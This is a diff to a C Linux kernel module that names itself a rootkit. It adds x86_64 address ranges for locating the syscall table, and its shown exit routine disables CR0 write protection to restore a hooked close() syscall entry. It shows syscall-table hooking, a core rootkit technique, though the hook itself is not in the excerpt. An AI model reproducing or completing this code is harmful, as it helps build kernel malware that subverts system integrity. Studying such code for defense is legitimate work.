@@ -4,17 +4,17 @@
 #include <linux/syscalls.h>
 #include <asm/unistd.h>
 
-//#if defined(__686__)
+#if defined(__x86_64__)
+#define SYSCALL_TABLE_START ((unsigned long) 0xffffffff81000000l)
+#define SYSCALL_TABLE_STOP ((unsigned long) 0xffffffffa2000000l)
+typedef unsigned long pointer_size_t;
+unsigned long **syscall_table;
+#else
 #define SYSCALL_TABLE_START ((unsigned long) 0xc0000000)
 #define SYSCALL_TABLE_STOP ((unsigned long) 0xd0000000)
 typedef unsigned int pointer_size_t;
 unsigned int **syscall_table;
-//#else
-//#define SYSCALL_TABLE_START ((unsigned long) 0xffffffff81000000l)
-//#define SYSCALL_TABLE_STOP ((unsigned long) 0xffffffffa2000000l)
-//typedef unsigned long pointer_size_t;
-//unsigned long **syscall_table;
-//#endif
+#endif
 
 asmlinkage int (*original_close)(int fd);
 
@@ -80,11 +80,11 @@ out:
 
 void rootkit_exit(void)
 {
-    // Disable write protection on page
     if (syscall_table == NULL) {
         printk("RKIT: Nothing to unload\n");
         goto out;
     }
+    // Disable write protection on page
     write_cr0(read_cr0() & (~0x10000));
     syscall_table[__NR_close] = (void *) original_close;
     // Enable write protection on page
